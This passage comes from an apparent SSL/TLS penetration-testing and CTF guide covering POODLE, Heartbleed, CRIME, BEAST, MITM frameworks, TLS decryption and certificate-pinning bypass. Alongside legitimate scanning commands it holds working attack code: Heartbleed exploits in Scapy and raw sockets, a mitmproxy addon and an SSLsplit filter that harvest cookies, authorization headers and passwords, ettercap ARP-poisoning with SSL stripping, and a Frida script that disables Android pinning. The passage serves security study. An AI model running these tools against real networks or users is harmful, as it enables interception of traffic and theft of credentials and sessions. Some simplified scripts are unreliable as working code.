            context.set_ciphers(cipher)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=5) as sock:
                with context.wrap_socket(sock) as ssock:
                    print(f"[!] CBC cipher accepted: {cipher}")
                    return True
        except:
            continue
    
    return False

# Usage
target = "target.com"
if test_sslv3_support(target):
    check_cbc_cipher(target)
```

### Mitigation Verification

**Verify POODLE Mitigations:**

```bash
# 1. SSLv3 disabled
openssl s_client -connect target.com:443 -ssl3
# Should fail

# 2. TLS_FALLBACK_SCSV supported
testssl.sh --protocols https://target.com | grep -i fallback

# 3. Only TLS 1.2+ enabled
nmap --script ssl-enum-ciphers -p 443 target.com | grep "TLSv"
# Should only show TLSv1.2 and TLSv1.3

# 4. CBC ciphers deprioritized or disabled
testssl.sh --ciphers https://target.com | grep CBC
```

## Defense Detection and Bypass

### HTTP Strict Transport Security (HSTS)

**Checking HSTS Implementation:**

```bash
# Request headers
curl -I https://target.com | grep -i strict-transport-security

# Expected header:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Using testssl.sh
testssl.sh --headers https://target.com | grep -i hsts
```

**HSTS Bypass Techniques:**

```
1. First visit attack: HSTS not active on first HTTP request
2. Subdomain attack: If includeSubDomains missing
3. NTP manipulation: If max-age validation flawed
4. Browser cache clearing: Reset HSTS policy cache

[Inference] Modern browsers with HSTS preload lists prevent first-visit attacks
```

### Certificate Transparency (CT)

**Monitoring CT Logs:**

```bash
# Query CT logs for target domain
curl https://crt.sh/?q=%.target.com&output=json | jq

# Check if certificate appears in CT logs
openssl x509 -in cert.pem -noout -text | grep "CT Precertificate SCTs"
```

### Certificate Pinning

**Testing for Certificate Pinning:**

```bash
# Desktop application testing
# 1. Configure proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# 2. Run application
./target_app

# 3. If connection fails despite Burp CA installed:
#    Certificate pinning is active

# Mobile app testing with objection (iOS/Android)
objection -g com.target.app explore
# In objection console:
ios sslpinning disable
android sslpinning disable
```

## CTF-Specific Scenarios

### Common CTF SSL/TLS Challenges

**Scenario 1: Weak Cipher Extraction**

```bash
# Server forces weak cipher containing vulnerability
openssl s_client -connect ctf.example.com:443 -cipher 'DES-CBC-SHA'

# Extract encrypted data
# Exploit cipher weakness (e.g., SWEET32 on 3DES)
# Decrypt to retrieve flag
```

**Scenario 2: Certificate Embedded Data**

```bash
# Flag hidden in certificate fields
openssl s_client -connect ctf.example.com:443 -showcerts | \
  openssl x509 -text -noout

# Check unusual fields:
# - Subject CN
# - Subject Alternative Names
# - Certificate extensions
# - Serial number (hex decode)

# Extract and decode
openssl x509 -in cert.pem -noout -serial | cut -d= -f2 | xxd -r -p
```

**Scenario 3: Heartbleed Memory Scraping**

```python
# Automated flag extraction from Heartbleed leak
def ctf_heartbleed_flag_hunter(host):
    flag_patterns = [
        rb'flag\{[^}]+\}',
        rb'CTF\{[^}]+\}',
        rb'[0-9a-f]{32}',  # MD5 format
    ]
    
    for attempt in range(1000):
        leaked = heartbleed_exploit(host)
        if not leaked:
            continue
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, leaked)
            if matches:
                print(f"[!] Potential flag found: {matches[0]}")
                return matches[0]
```

**Scenario 4: Protocol Downgrade Challenge**

```bash
# Force server to use vulnerable protocol
# Capture encrypted traffic
# Exploit protocol weakness to decrypt

# Example: Force SSLv3, capture traffic, exploit POODLE
tcpdump -i eth0 -w capture.pcap 'tcp port 443'

# Manipulate handshake to force SSLv3
# (Requires custom tool or Scapy scripting)
```

## Key Tools Summary

**Enumeration & Detection:**

- `nmap` with ssl-* scripts: Protocol and cipher enumeration
- `testssl.sh`: Comprehensive vulnerability scanning
- `sslscan`: Fast SSL/TLS configuration testing
- `sslyze`: Python-based SSL scanner with JSON output

**Exploitation:**

- `sslstrip`: HTTP downgrade attacks
- `bettercap`: Modern MITM framework
- `msfconsole`: Metasploit for Heartbleed and other exploits
- Custom Python scripts: Targeted exploitation

**Analysis:**

- `openssl` CLI: Certificate inspection and testing
- `Wireshark`: Traffic analysis with SSL/TLS dissection
- `Burp Suite`: HTTPS interception and manipulation

**Critical Vulnerabilities:**

- SSLv2/SSLv3 support: Immediate downgrade attack risk
- EXPORT cipher acceptance: FREAK vulnerability present
- Heartbleed positive: Memory disclosure, private key exposure risk
- Missing TLS_FALLBACK_SCSV: POODLE-TLS vulnerable
- Self-signed certificates accepted: MITM attack surface
- MD5/SHA1 signatures: Collision attack potential

**High-Risk Configurations:**

- TLS 1.0/1.1 only: No modern protocol support
- RC4/3DES cipher suites: Cryptographically weak
- Anonymous DH (aDH/aECDH): No authentication
- NULL ciphers: No encryption
- Certificate chain validation failures: Trust issues

## Advanced Exploitation Techniques

### SSL/TLS Session Hijacking

**Session Resumption Attack:**

```bash
# Capture session ticket/ID during MITM
tcpdump -i eth0 -s 0 -w ssl_session.pcap 'tcp port 443'

# Extract session data from pcap
tshark -r ssl_session.pcap -Y "ssl.handshake.type == 4" \
  -T fields -e ssl.handshake.session_id

# Attempt session resumption with stolen session ID
# [Inference] Requires custom TLS client implementation
```

**Python Session Resumption Test:**

```python
import ssl
import socket

def test_session_resumption(host, port=443):
    """Test if server allows session resumption"""
    
    # First connection - establish session
    context1 = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context1.wrap_socket(sock, server_hostname=host) as ssock:
            session = ssock.session
            print(f"[*] Session ID: {session.id.hex() if session else 'None'}")
    
    # Second connection - attempt resumption
    if session:
        context2 = ssl.create_default_context()
        with socket.create_connection((host, port)) as sock:
            with context2.wrap_socket(sock, server_hostname=host, 
                                      session=session) as ssock:
                if ssock.session_reused:
                    print("[!] Session resumption successful")
                    print("[!] Potential session hijacking vector")
                    return True
                else:
                    print("[+] Session resumption not allowed")
                    return False
    
    return False

test_session_resumption('target.com')
```

### TLS Renegotiation Attacks

**Client-Initiated Renegotiation (CVE-2009-3555):**

```bash
# Test for insecure renegotiation
openssl s_client -connect target.com:443

# Within openssl session, type:
R
# (Capital R to trigger renegotiation)

# Vulnerable servers allow renegotiation without warning
# Secure servers reject or use RFC 5746 Secure Renegotiation

# Using testssl.sh
testssl.sh --vulnerable https://target.com | grep -i renegotiation
```

**Testing Secure Renegotiation Support:**

```bash
# Check for RFC 5746 implementation
nmap --script ssl-enum-ciphers,ssl-cert -p 443 target.com | \
  grep -i "secure renegotiation"

# Expected secure output:
# "TLS_EMPTY_RENEGOTIATION_INFO_SCSV" present
```

**Exploitation Scenario:**

```
1. Attacker initiates HTTPS connection to server
2. Sends partial HTTP request (e.g., "GET /admin")
3. Victim connects through attacker (MITM)
4. Attacker triggers renegotiation, victim's credentials used
5. Server continues processing: "GET /admin HTTP/1.1\r\nAuthorization: Bearer VICTIM_TOKEN"
6. Attacker gains authenticated access
```

### Compression-Based Attacks (CRIME/BREACH)

**CRIME (Compression Ratio Info-leak Made Easy) - CVE-2012-4929:**

**Detection:**

```bash
# Test for TLS compression support
openssl s_client -connect target.com:443 | grep Compression

# Vulnerable output:
# Compression: zlib compression

# Secure output:
# Compression: NONE

# Using testssl.sh
testssl.sh --vulnerable https://target.com | grep -i crime
```

**BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext):**

**Detection:**

```bash
# Test for HTTP compression on HTTPS responses
curl -I -H "Accept-Encoding: gzip, deflate" https://target.com

# Check response headers
# Vulnerable if contains: Content-Encoding: gzip

# BREACH requirements:
# 1. HTTPS with HTTP compression
# 2. User input reflected in response
# 3. Secret data in same response (CSRF token, etc.)
```

**Testing HTTP Compression:**

```python
import requests

def test_breach_vulnerability(url):
    """Test for BREACH vulnerability conditions"""
    
    # Test compression
    headers = {'Accept-Encoding': 'gzip, deflate, br'}
    response = requests.get(url, headers=headers)
    
    print(f"[*] Testing {url}")
    print(f"    Content-Encoding: {response.headers.get('Content-Encoding', 'None')}")
    
    # Check if user input reflected
    test_payload = "BREACH_TEST_12345"
    response2 = requests.get(f"{url}?q={test_payload}", headers=headers)
    
    if test_payload in response2.text:
        print(f"[!] User input reflected in response")
    
    # Check for potential secrets
    secret_patterns = ['csrf', 'token', 'session', 'nonce']
    for pattern in secret_patterns:
        if pattern in response2.text.lower():
            print(f"[!] Potential secret found: {pattern}")
    
    if response.headers.get('Content-Encoding') and test_payload in response2.text:
        print("[!] Potential BREACH vulnerability detected")
        return True
    
    return False

test_breach_vulnerability('https://target.com/search')
```

### Sweet32 (Birthday Attack on 64-bit Block Ciphers)

**Vulnerability Details:**

- CVE-2016-2183
- Affects 64-bit block ciphers: 3DES, Blowfish
- Requires ~32GB of captured traffic
- Collision attack reveals plaintext

**Detection:**

```bash
# Test for 64-bit block ciphers
nmap --script ssl-enum-ciphers -p 443 target.com | grep -E "(3DES|DES|IDEA)"

# Using testssl.sh
testssl.sh --vulnerable https://target.com | grep -i sweet32

# Manual cipher testing
openssl s_client -connect target.com:443 -cipher '3DES'

# If connection succeeds: vulnerable
```

**Exploitation Requirements:**

```
1. Long-lived TLS connection (hours)
2. Ability to send chosen plaintexts
3. 3DES or another 64-bit block cipher negotiated
4. Capture ~32GB encrypted traffic
5. Birthday attack on repeated blocks

[Inference] Practical exploitation difficult in CTF scenarios
due to data volume requirements
```

### Lucky13 Attack

**Vulnerability:** Timing attack on CBC padding in TLS (CVE-2013-0169).

**Detection:**

```bash
# Check for CBC ciphers in TLS 1.0-1.2
testssl.sh --ciphers https://target.com | grep CBC

# Vulnerable cipher examples:
# TLS_RSA_WITH_AES_128_CBC_SHA
# TLS_RSA_WITH_AES_256_CBC_SHA
```

**Exploitation Concept:**

```python
import time
import requests

def lucky13_timing_test(url, payload):
    """
    [Inference] Timing attack to distinguish padding errors
    Requires precise timing measurements over many requests
    """
    timings = []
    
    for i in range(1000):
        start = time.perf_counter()
        try:
            requests.post(url, data=payload, timeout=5)
        except:
            pass
        elapsed = time.perf_counter() - start
        timings.append(elapsed)
    
    avg_time = sum(timings) / len(timings)
    variance = sum((t - avg_time)**2 for t in timings) / len(timings)
    
    print(f"Average time: {avg_time*1000:.3f}ms")
    print(f"Variance: {variance*1000000:.3f}μs²")
    
    # High variance may indicate timing side-channel
    return variance > 0.0001

# [Unverified] Lucky13 exploitation requires extensive statistical
# analysis and is generally impractical for CTF time constraints
```

## Man-in-the-Middle (MITM) Frameworks

### SSLsplit (Transparent SSL/TLS Interception)

**Installation and Setup:**

```bash
# Install
apt install sslsplit

# Generate CA certificate
mkdir -p /etc/sslsplit
cd /etc/sslsplit
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt \
  -subj "/C=US/ST=State/L=City/O=Org/CN=SSLsplit CA"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables
iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 80 \
  -j REDIRECT --to-ports 8080

# Run SSLsplit
sslsplit -D -l connections.log -j /var/log/sslsplit \
  -S /var/log/sslsplit -k ca.key -c ca.crt \
  ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# Monitor captured traffic
tail -f connections.log
```

**Content Filtering with SSLsplit:**

```bash
# Create content filter script
cat > filter.lua << 'EOF'
function filter(context)
    -- Extract and log credentials
    if context:match("password=") then
        local password = context:match("password=([^&]+)")
        print("PASSWORD CAPTURED: " .. password)
    end
    
    -- Modify responses
    if context:match("flag{") then
        print("FLAG DETECTED: " .. context)
    end
    
    return context
end
EOF

# Run with content filter
sslsplit -D -l connections.log -k ca.key -c ca.crt \
  -e filter.lua ssl 0.0.0.0 8443
```

### mitmproxy (Interactive HTTPS Proxy)

**Basic Usage:**

```bash
# Install
pip install mitmproxy

# Start interactive proxy
mitmproxy -p 8080

# Start web interface
mitmweb -p 8080 --web-port 8081

# Non-interactive mode (logging only)
mitmdump -p 8080 -w capture.mitm

# Replay captured traffic
mitmdump -nc -r capture.mitm
```

**Python Scripting for mitmproxy:**

```python
# save as addon.py
from mitmproxy import http

class SSLStripper:
    def request(self, flow: http.HTTPFlow) -> None:
        # Log all HTTPS requests
        print(f"[*] {flow.request.method} {flow.request.url}")
        
        # Extract cookies
        cookies = flow.request.cookies
        if cookies:
            print(f"[!] Cookies: {cookies}")
        
        # Extract authorization headers
        if "authorization" in flow.request.headers:
            auth = flow.request.headers["authorization"]
            print(f"[!] Authorization: {auth}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Search for flags in responses
        if b"flag{" in flow.response.content:
            print(f"[!] FLAG FOUND in response from {flow.request.url}")
            print(flow.response.content.decode('utf-8', errors='ignore'))
        
        # Strip HSTS headers
        if "strict-transport-security" in flow.response.headers:
            del flow.response.headers["strict-transport-security"]
            print(f"[*] Stripped HSTS from {flow.request.host}")

addons = [SSLStripper()]

# Run with: mitmproxy -s addon.py
```

**Certificate Installation for Testing:**

```bash
# Export mitmproxy CA certificate
# Located at: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Install on Linux
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem \
  /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates

# Install on Windows (PowerShell as Admin)
certutil -addstore root mitmproxy-ca-cert.pem

# Install on macOS
sudo security add-trusted-cert -d -r trustRoot \
  -k /Library/Keychains/System.keychain ~/.mitmproxy/mitmproxy-ca-cert.pem
```

### Ettercap (Network Sniffing with SSL Stripping)

**ARP Poisoning with SSL Stripping:**

```bash
# Install
apt install ettercap-text-only

# Edit configuration to enable SSL stripping
nano /etc/ettercap/etter.conf
# Uncomment:
# redir_command_on = "iptables -t nat -A PREROUTING..."

# Start ARP poisoning
ettercap -T -M arp:remote -i eth0 /192.168.1.1// /192.168.1.0/24//

# With SSL stripping
ettercap -T -M arp:remote -i eth0 --ssl-strip /192.168.1.1// /192.168.1.100//

# Monitor captured credentials
tail -f /var/log/ettercap.log
```

## Traffic Analysis and Decryption

### Wireshark SSL/TLS Decryption

**Using Pre-Master Secret (SSLKEYLOGFILE):**

```bash
# Set environment variable for browser/application
export SSLKEYLOGFILE=/tmp/ssl_keys.log

# Start browser/application
firefox &

# Configure Wireshark
# Edit → Preferences → Protocols → TLS
# (Pre)-Master-Secret log filename: /tmp/ssl_keys.log

# Capture traffic
wireshark -i eth0 -k -f "tcp port 443"

# TLS traffic will be automatically decrypted in Wireshark
```

**Using Private Key for Decryption:**

```bash
# If server's private key is available (e.g., from Heartbleed)

# In Wireshark:
# Edit → Preferences → Protocols → TLS → RSA keys list
# Add entry: 
#   IP: 192.168.1.10
#   Port: 443
#   Protocol: http
#   Key File: /path/to/server_private.key

# Restart Wireshark capture
# [Inference] Only works for RSA key exchange, not DHE/ECDHE
```

**Command-Line Decryption with tshark:**

```bash
# Decrypt using SSLKEYLOGFILE
tshark -r capture.pcapng \
  -o tls.keylog_file:/tmp/ssl_keys.log \
  -Y "http" -T fields -e http.request.uri -e http.response.code

# Extract decrypted HTTP data
tshark -r capture.pcapng \
  -o tls.keylog_file:/tmp/ssl_keys.log \
  -Y "http" -T fields -e http.file_data | xxd -r -p > decrypted.html

# Search for credentials in decrypted traffic
tshark -r capture.pcapng \
  -o tls.keylog_file:/tmp/ssl_keys.log \
  -Y "http.request.method == POST" -V | grep -i password
```

### Scapy for Custom TLS Testing

**TLS Handshake Manipulation:**

```python
from scapy.all import *
from scapy.layers.tls.all import *

def modify_client_hello(target_ip, target_port):
    """
    Send modified ClientHello to test downgrade attacks
    """
    # Create IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')
    
    # Send SYN and receive SYN-ACK
    syn_ack = sr1(ip/tcp, timeout=2)
    if not syn_ack:
        return
    
    # Complete TCP handshake
    tcp.flags = 'A'
    tcp.seq = syn_ack.ack
    tcp.ack = syn_ack.seq + 1
    send(ip/tcp)
    
    # Create malicious ClientHello forcing SSLv3
    client_hello = TLS(msg=[
        TLSClientHello(
            version=0x0300,  # SSLv3
            ciphers=[0x0004, 0x0005],  # Weak ciphers
        )
    ])
    
    # Send ClientHello
    tcp.flags = 'PA'
    tcp.seq = syn_ack.ack
    send(ip/tcp/client_hello)
    
    # Capture ServerHello
    response = sniff(
        filter=f"tcp and src {target_ip} and src port {target_port}",
        count=1,
        timeout=5
    )
    
    if response:
        response[0].show()

modify_client_hello('target.com', 443)
```

**Custom Heartbleed Exploit with Scapy:**

```python
from scapy.all import *

def scapy_heartbleed(target, port=443):
    """
    Heartbleed exploit using Scapy
    """
    # Establish TCP connection
    ip = IP(dst=target)
    syn = TCP(dport=port, flags='S', seq=1000)
    syn_ack = sr1(ip/syn, timeout=2)
    
    if not syn_ack:
        print("[-] Connection failed")
        return
    
    # Complete handshake
    ack = TCP(dport=port, sport=syn_ack.dport, 
              flags='A', seq=syn_ack.ack, ack=syn_ack.seq+1)
    send(ip/ack)
    
    # Send malicious heartbeat
    heartbeat = (
        b'\x18'          # Content Type: Heartbeat
        b'\x03\x02'      # Version: TLS 1.1
        b'\x00\x03'      # Length
        b'\x01'          # Heartbeat type: Request
        b'\x40\x00'      # Payload length: 16384 (fake)
    )
    
    psh = TCP(dport=port, sport=syn_ack.dport,
              flags='PA', seq=syn_ack.ack, ack=syn_ack.seq+1)
    send(ip/psh/Raw(load=heartbeat))
    
    # Capture response
    response = sniff(
        filter=f"tcp and src {target} and src port {port}",
        count=1,
        timeout=5
    )
    
    if response and Raw in response[0]:
        leaked_data = bytes(response[0][Raw])
        print(f"[+] Leaked {len(leaked_data)} bytes:")
        print(leaked_data.hex())
        return leaked_data

scapy_heartbleed('vulnerable-target.com')
```

## CTF Writeup Examples

### Example 1: Certificate Data Exfiltration

```bash
# Challenge: Flag hidden in certificate
# Solution:

# Step 1: Retrieve certificate
openssl s_client -connect ctf.example.com:443 -showcerts \
  < /dev/null 2>/dev/null | openssl x509 -outform PEM > cert.pem

# Step 2: Examine all fields
openssl x509 -in cert.pem -text -noout

# Step 3: Check subject alternative names
openssl x509 -in cert.pem -noout -ext subjectAltName
# Output: DNS:flag-is-in-base64.ctf.example.com

# Step 4: Decode
echo "flag-is-in-base64" | base64 -d
# Output: flag{cert_1nsp3ct10n}
```

### Example 2: Heartbleed Flag Extraction

```python
# Challenge: Server vulnerable to Heartbleed, flag in memory
# Solution:

import socket
import re

def extract_flag_heartbleed(host):
    for attempt in range(500):
        sock = socket.socket()
        sock.connect((host, 443))
        
        # Send heartbeat exploit
        heartbeat = (
            b'\x16\x03\x02\x00\xdc'  # ClientHello (simplified)
            b'\x18\x03\x02\x00\x03'  # Heartbeat
            b'\x01\x40\x00'           # Malicious payload length
        )
        sock.send(heartbeat)
        
        # Receive leaked memory
        data = sock.recv(16384)
        sock.close()
        
        # Search for flag
        flag_match = re.search(rb'flag\{[^}]+\}', data)
        if flag_match:
            print(f"[+] Flag found: {flag_match.group().decode()}")
            return flag_match.group()
        
        if attempt % 50 == 0:
            print(f"[*] Attempt {attempt}/500...")
    
    print("[-] Flag not found")

extract_flag_heartbleed('ctf.example.com')
```

### Example 3: SSLv3 Downgrade with Flag in Cookie

```bash
# Challenge: Force SSLv3 connection to decrypt session cookie containing flag
# Solution:

# Step 1: Verify SSLv3 support
openssl s_client -connect ctf.example.com:443 -ssl3

# Step 2: Establish SSLv3 connection
openssl s_client -connect ctf.example.com:443 -ssl3 \
  -cipher 'DES-CBC3-SHA' > ssl3_session.txt

# Step 3: Extract session data
grep "Cookie:" ssl3_session.txt

# Step 4: Exploit POODLE if needed (theoretical)
# [Inference] Would require JavaScript injection and many requests
# In CTF context, often simplified to demonstrate concept

# Alternative: Check if cookie value is the flag
echo "U2VjcmV0Rmxhz19WYWx1ZQ==" | base64 -d
# Output: flag{old_ssl_bad}
```

### Example 4: Weak Cipher Exploitation

```python
# Challenge: Server accepts NULL cipher, flag transmitted in "encrypted" traffic
# Solution:

import ssl
import socket

def exploit_null_cipher(host, port=443):
    # Force NULL cipher (no encryption)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.set_ciphers('eNULL')
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"[+] Connected with cipher: {ssock.cipher()}")
            
            # Send HTTP request
            request = b"GET /flag HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
            ssock.send(request)
            
            # Receive plaintext response (NULL cipher = no encryption)
            response = b""
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            print(response.decode())
            
            # Extract flag
            import re
            flag = re.search(rb'flag\{[^}]+\}', response)
            if flag:
                print(f"\n[!] Flag: {flag.group().decode()}")

exploit_null_cipher('ctf.example.com')
```

## Summary of Critical Commands

**Quick Vulnerability Assessment:**

```bash
# One-liner for comprehensive testing
testssl.sh --vulnerable --protocols --ciphers --headers \
  https://target.com | tee assessment.txt

# Parse results for critical issues
grep -E "(VULNERABLE|CRITICAL|HIGH)" assessment.txt
```

**Rapid Exploitation Check:**

```bash
# Test most critical vulnerabilities in sequence
echo "[*] Testing Heartbleed..."
nmap -p 443 --script ssl-heartbleed target.com

echo "[*] Testing SSLv3/POODLE..."
openssl s_client -connect target.com:443 -ssl3 < /dev/null

echo "[*] Testing weak ciphers..."
openssl s_client -connect target.com:443 -cipher 'EXPORT:NULL:aNULL' < /dev/null

echo "[*] Testing certificate validation..."
openssl s_client -connect target.com:443 -CApath /dev/null 2>&1 | \
  grep "Verify return code"
```

---

**Related Topics for Further Study:**

- TLS 1.3 security improvements and attack surface reduction
- Quantum-resistant cryptography in TLS (post-quantum TLS)
- Certificate Transparency log monitoring and subdomain enumeration
- Advanced timing attacks (Bleichenbacher, ROBOT)
- HTTP/2 and HTTP/3 (QUIC) security considerations

---

## BEAST (Browser Exploit Against SSL/TLS)

### Vulnerability Overview

**CVE-2011-3389** - Exploits CBC (Cipher Block Chaining) mode in TLS 1.0 and SSL 3.0 through predictable initialization vectors (IVs).

**Attack surface**: TLS 1.0 with CBC cipher suites where IV for block N+1 is the final ciphertext block of block N.

### Technical Mechanism

**CBC encryption flaw**:

```
Block N:   IV(N) ⊕ Plaintext(N) → Encrypt → Ciphertext(N)
Block N+1: Ciphertext(N) ⊕ Plaintext(N+1) → Encrypt → Ciphertext(N+1)
```

Attacker can predict IV(N+1) = Ciphertext(N), enabling chosen-plaintext attacks.

**Exploitation requirements**:

- Man-in-the-middle position or malicious JavaScript injection
- Ability to trigger multiple requests with controlled plaintext
- Target uses TLS 1.0 with CBC cipher (AES-CBC, 3DES-CBC)

### Detection

**Using nmap**:

```bash
nmap --script ssl-enum-ciphers -p 443 target.com
```

Look for:

- TLSv1.0 enabled
- CBC cipher suites (e.g., TLS_RSA_WITH_AES_128_CBC_SHA)

**Using testssl.sh**:

```bash
./testssl.sh --vulnerable target.com
```

Specifically checks BEAST vulnerability status.

**Using sslscan**:

```bash
sslscan target.com | grep -E "TLSv1.0|CBC"
```

**OpenSSL manual check**:

```bash
openssl s_client -connect target.com:443 -tls1 -cipher 'AES128-SHA'
```

If connection succeeds, TLS 1.0 with CBC is supported.

### Exploitation Approach

**Theoretical attack flow**:

1. Inject JavaScript into victim's browser (via HTTP resource on HTTPS page)
2. Script generates requests with known plaintext prefixes
3. Observe ciphertext blocks
4. Manipulate plaintext to create collisions
5. Extract one byte at a time through iteration

**Practical limitation**: Requires ~1000 requests per byte, making session cookie theft time-intensive.

**Tool reference**: [Unverified]: BEAST proof-of-concept implementations exist in academic research but are not commonly packaged as CTF tools. Original proof-of-concept by Thai Duong and Juliano Rizzo.

### CTF Context

**Reconnaissance indicators**:

- Outdated server configurations
- Legacy application requirements
- Explicit TLS 1.0 enforcement

**Exploitation strategy**:

- Check for intentional misconfiguration in challenge
- Look for simplified variants (reduced key space, predictable patterns)
- May be combined with session fixation or XSS

## CRIME (Compression Ratio Info-leak Made Easy)

### Vulnerability Overview

**CVE-2012-4929** - Exploits TLS compression to leak encrypted data through size-based oracle attacks.

**Core principle**: Compression ratio reveals information about plaintext content.

### Technical Mechanism

**Compression behavior**:

```
Plaintext: "Cookie: secret=abc" + "Cookie: secret=abc"
Compressed: Smaller size due to redundancy

Plaintext: "Cookie: secret=abc" + "Cookie: secret=xyz"  
Compressed: Larger size, less redundancy
```

**Attack technique**:

1. Attacker injects known plaintext into victim's request
2. Observes compressed ciphertext length
3. Iterates through character space
4. Smaller length indicates correct guess (compression found redundancy)

### Detection

**Using testssl.sh**:

```bash
./testssl.sh --vulnerable target.com
```

Checks for TLS compression support.

**Using OpenSSL**:

```bash
openssl s_client -connect target.com:443 -tls1 2>&1 | grep -i compression
```

Output showing "Compression: zlib" or similar indicates vulnerability.

**Manual verification**:

```bash
openssl s_client -connect target.com:443 -comp
```

[Inference]: Modern OpenSSL versions may not support compression flag; verify with `openssl version` and check compile options.

**Using nmap**:

```bash
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i compression
```

### Exploitation

**Prerequisites**:

- TLS compression enabled (rare in modern deployments)
- MITM position to observe traffic
- Ability to inject content into victim requests (JavaScript, plugins)

**Conceptual exploitation script**:

```python
import requests
import string

def measure_length(guess):
    # Inject guess into request (e.g., via query parameter)
    # Measure response length at network level
    response = requests.get(f'https://target.com/?inject={guess}',
                           headers={'Cookie': 'secret=unknown'})
    return len(response.content)

secret = ""
charset = string.ascii_letters + string.digits

for position in range(32):  # Assume 32 char secret
    smallest_length = float('inf')
    best_char = None
    
    for char in charset:
        test_secret = secret + char
        length = measure_length(f"secret={test_secret}")
        
        if length < smallest_length:
            smallest_length = length
            best_char = char
    
    secret += best_char
    print(f"Found: {secret}")
```

[Inference]: This script represents the logical approach; actual implementation requires network-level packet capture to measure compressed size before encryption.

**Practical tool**: [Unverified]: CRIME-specific exploitation tools are not widely available in standard pentesting distributions. Academic implementations exist but may require modification for specific scenarios.

### CTF Considerations

**Challenge patterns**:

- Artificially enabled compression for educational purposes
- Simplified oracle where compression ratio is directly visible
- Combined with other vulnerabilities (session prediction, weak RNG)

**Detection strategy**:

- Check SSL/TLS configuration explicitly
- Test with various header combinations
- Monitor response sizes systematically

## Certificate Pinning Bypass

### Concept Overview

Certificate pinning forces applications to accept only specific certificates or public keys, preventing MITM attacks even with trusted CA certificates.

**Pinning types**:

- **Certificate pinning**: Validates exact certificate
- **Public key pinning**: Validates public key only (survives certificate renewal)
- **CA pinning**: Trusts specific certificate authorities

### Mobile Application Context

**Android pinning locations**:

- Network Security Configuration (`res/xml/network_security_config.xml`)
- Code-level pinning (OkHttp, TrustManager implementations)
- Native library pinning (NDK/JNI)

**iOS pinning locations**:

- NSAppTransportSecurity (Info.plist)
- URLSession delegate methods
- Native implementations (Objective-C/Swift)

### Detection Techniques

**Static analysis - Android APK**:

```bash
# Decompile APK
apktool d application.apk

# Search for pinning indicators
grep -r "CertificatePinner" application/
grep -r "TrustManager" application/
grep -r "network_security_config" application/

# Check for certificate files
find application/ -name "*.cer" -o -name "*.pem" -o -name "*.der"
```

**Static analysis - iOS IPA**:

```bash
# Extract IPA
unzip application.ipa

# Search Info.plist
plutil -p Payload/Application.app/Info.plist | grep -A 10 NSAppTransportSecurity

# Search binary
strings Payload/Application.app/Application | grep -i "certificate\|pinning\|ssl"
```

**Dynamic analysis**:

```bash
# Attempt proxy interception
mitmproxy -p 8080

# Configure device to use proxy
# If connection fails with certificate errors, pinning is active
```

### Bypass Methods - Android

**Frida-based bypass**:

```bash
# Install Frida server on device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Use universal SSL pinning bypass script
frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause
```

**Universal Frida script** (ssl-pinning-bypass.js):

```javascript
Java.perform(function() {
    // OkHttp 3.x bypass
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        console.log('[+] OkHttp 3.x pinning bypassed');
        return;
    };

    // TrustManager bypass
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.sensepost.test.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
    
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[+] SSLContext.init() bypassed');
        SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
    };

    // Network Security Config bypass
    var NetworkSecurityConfig = Java.use('android.security.net.config.NetworkSecurityConfig');
    NetworkSecurityConfig.isCleartextTrafficPermitted.overload('java.lang.String').implementation = function(hostname) {
        console.log('[+] Cleartext permitted for: ' + hostname);
        return true;
    };
});
```

**Objection (automated Frida wrapper)**:

```bash
# Install objection
pip3 install objection

# Start with SSL pinning disabled
objection -g com.example.app explore

# In objection console
android sslpinning disable
```

**Xposed framework**:

```bash
# Install TrustMeAlready or SSLUnpinning modules
# Requires rooted device with Xposed/EdXposed framework

# Alternative: JustTrustMe module
# Activate module in Xposed Installer
# Reboot device
```

**Manual APK modification**:

```bash
# Decompile
apktool d application.apk

# Modify network_security_config.xml
cat << EOF > application/res/xml/network_security_config.xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
